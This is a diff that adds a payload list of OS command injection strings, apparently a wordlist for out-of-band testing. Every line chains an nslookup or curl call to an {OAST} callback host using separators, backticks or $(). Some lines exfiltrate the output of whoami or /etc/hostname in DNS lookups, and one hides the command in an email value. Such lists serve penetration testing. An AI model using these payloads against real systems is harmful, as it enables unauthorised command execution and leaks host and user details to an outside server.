@@ -1,0 +1,17 @@
+;nslookup {OAST}
+|nslookup {OAST}
+||nslookup {OAST}
+&nslookup {OAST}
+&&nslookup {OAST}
+1||nslookup {OAST}||
+|| nslookup {OAST} ||
+& nslookup {OAST} &
+test@test.com||nslookup {OAST}||
+`nslookup {OAST}`
+$(nslookup {OAST})
+||curl {OAST}||
+||curl http://{OAST}||
+||nslookup `whoami`.{OAST}||
+||nslookup $(whoami).{OAST}||
+||nslookup $(cat /etc/hostname).{OAST}||
+||curl `whoami`.{OAST}||
